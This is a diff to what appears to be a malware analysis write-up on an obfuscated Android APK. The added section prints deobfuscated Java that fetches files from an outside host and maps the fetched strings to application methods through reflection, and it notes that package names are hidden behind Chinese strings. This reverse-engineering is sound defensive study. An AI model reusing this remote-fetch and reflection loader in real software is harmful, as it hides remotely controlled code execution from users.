@@ -131,9 +131,48 @@ Given that information, we may assume that Java code is parsing these names and 
 
 ## Exploring readable files
 
+We can see that inside function a() (obfuscated) a string is being splitted by '|' character. To make it more clear we did some deofuscation and achieved the following result
+
+```
+public static void fetchFilesAndProcess() {
+        String str;
+        Session session = new Session();
+        HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
+        getrequest.request("https://befukiv.com/muchaspuchas");
+        HttpHandler call = getrequest.call();
+        HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
+        getrequest2.request("https://befukiv.com/cortina");
+        HttpHandler call2 = getrequest2.call();
+        try {
+            ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
+            byte[] parse = parseHttpResponseBody.parse();
+            TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
+            Charset charset = z4.h.utf8Charset;
+            if (twoStrings != null && (str = twoStrings.secondStr) != null) {
+                charset = Charset.forName(str);
+            }
+            muchasStrings.set(new String(parse, charset.name()).split("\\|"));
+            byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
+            if (fetchAndProcessCompleted.get()) {
+                return;
+            }
+            fw.getClass();
+            FileWriter.mapMuchasStringsToMethods(parse2);
+            fetchAndProcessCompleted.set(true);
+        } catch (Throwable th) {
+            th.printStackTrace();
+        }
+    }
+```
+
+As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
+This shows that authors wanted to obfuscate application method calls with reflection.
+
+
 TODO
 1. muchaspuchas maybe a CSV type file
 2. Based on 1., we look for split functions.
+
 
 
 Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
